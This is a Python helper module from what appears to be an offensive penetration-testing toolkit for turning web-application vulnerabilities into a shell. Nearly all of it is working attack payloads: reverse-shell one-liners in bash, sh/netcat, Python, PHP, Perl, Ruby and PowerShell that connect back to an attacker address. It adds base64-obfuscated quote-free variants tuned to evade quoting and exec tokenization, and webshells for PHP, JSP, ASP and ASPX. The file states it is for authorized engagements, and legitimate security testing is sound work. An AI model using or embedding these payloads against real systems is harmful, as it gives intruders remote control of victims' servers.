"""Shared payloads + helpers for the foothold module (web/app exploitation -> shell).

access/web/ = get a shell by EXPLOITING an application vuln (RCE, traversal/LFI, SQLi, upload, SSTI,
deserialization, SSRF/XXE). Sister to ../network/ (shell via creds/spray/network services). Both PRINT
commands/payloads you run from the ATTACKER box; the shell they land feeds the privesc kits + report/.

Authorized engagements only. Edit LHOST/LPORT/TURL here; every generator reads it.
"""
import base64, urllib.parse

# ================= EDIT THESE =================
LHOST, LPORT = "10.10.14.7", 443
TURL = "http://10.0.0.5"          # target base URL (for web techniques)
# =============================================

def b64(s): return base64.b64encode(s.encode()).decode()
def url(s):  return urllib.parse.quote(s, safe="")
def urlall(s): return urllib.parse.quote(s, safe="")

# --- reverse shells per language (pick by what the target can run) ---
def revshell(lang="bash"):
    L, P = LHOST, LPORT
    R = {
        "bash":   f"bash -c 'bash -i >& /dev/tcp/{L}/{P} 0>&1'",
        "bash64": "bash -c '{echo," + b64(f"bash -i >& /dev/tcp/{L}/{P} 0>&1") + "}|{base64,-d}|bash'",
        "sh":     f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {L} {P} >/tmp/f",
        "nc":     f"nc {L} {P} -e /bin/sh",
        "python": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{L}\",{P}));"
                  f"[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
        "php":    f"php -r '$s=fsockopen(\"{L}\",{P});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl":   f"perl -e 'use Socket;$i=\"{L}\";$p={P};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                  f"connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                  f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "ruby":   f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{L}\",{P});loop{{c.gets.chomp!;"
                  f"(exit! if $_==\"exit\");($_=~/cd (.+)/i?Dir.chdir($1):c.puts(`#{{$_}} 2>&1`))}}'",
        "powershell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{L}',{P});$s=$c.GetStream();"
                  f"[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                  f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);"
                  f"$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}\"",
    }
    return R.get(lang, R["bash"])


def revshell_nq():
    """QUOTE-FREE reverse shell for embedding inside an already-quoted payload (SSTI/deserial bodies,
    a single-quoted SQL string like COPY ... FROM PROGRAM '...'). Contains no ' or " so it can never
    collide with the surrounding quotes. Needs a REAL SHELL at the sink (system()/popen()/sh -c) —
    for a Runtime.exec(String) sink use revshell_exec() instead (no shell, no pipes)."""
    return "echo " + b64(revshell("bash")) + "|base64 -d|bash"


def revshell_exec():
    """Reverse shell for a `Runtime.getRuntime().exec(String)` sink — Java gadget chains (ysoserial),
    FreeMarker `Execute`, Velocity. exec(String) TOKENIZES ON WHITESPACE and does NOT invoke a shell,
    so a normal `echo <b64>|base64 -d|bash` pipeline is handed to /bin/echo as literal argv and never
    decodes or pipes. The brace form below is whitespace-free after `bash -c`, so it survives
    tokenization intact and bash then brace-expands + pipes it. Also quote-free (safe to nest)."""
    return "bash -c {echo," + b64(f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1") + "}|{base64,-d}|bash"

# QUOTE-FREE php webshell — use whenever the body is embedded inside a SINGLE-quoted shell arg
# (echo '...') or single-quoted SQL. The normal ?c= bodies below contain 'c', which would close the
# outer quote and leave a bareword => PHP 8 fatal. Numeric index needs no quotes. Trigger  ?0=<cmd>.
WEBSHELL_PHP_NQ = "<?php system($_GET[0]);?>"

# --- minimal webshells per language (drop where code executes; ?c=<cmd> runs it) ---
WEBSHELL = {
    "php":  "<?php system($_REQUEST['c']); ?>",
    "php2": "<?php echo shell_exec($_GET['c']); ?>",   # alt if system() disabled
    "jsp":  "<% out.println(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"c\"))"
            ".getInputStream()).useDelimiter(\"\\\\A\").next()); %>",
    "asp":  "<% eval request(\"c\") %>",
    "aspx": "<%@ Page Language=\"C#\"%><% System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"c\"]); %>",
}
